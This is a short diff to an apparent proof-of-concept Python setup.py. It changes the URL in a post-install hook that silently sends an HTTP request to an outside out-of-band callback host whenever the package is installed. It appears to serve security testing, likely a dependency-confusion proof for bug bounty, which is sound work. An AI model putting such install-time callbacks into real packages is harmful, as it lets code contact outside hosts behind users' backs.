@@ -15,7 +15,7 @@ class PostInstallCommand(install):
         print("Package 'my_poc_package' has been successfully installed!")
         # You can add your custom logic here, such as calling a function from your package
         import requests
-        requests.get("https://0abhjbkjgw63avm5jtogkd3tjkpode13.i.ywh.at")
+        requests.get("https://f2iwbqcy8byi2aekb8gvcsv8bzh45utj.i.ywh.at")
 
 setup(
     name='my_poc_package',
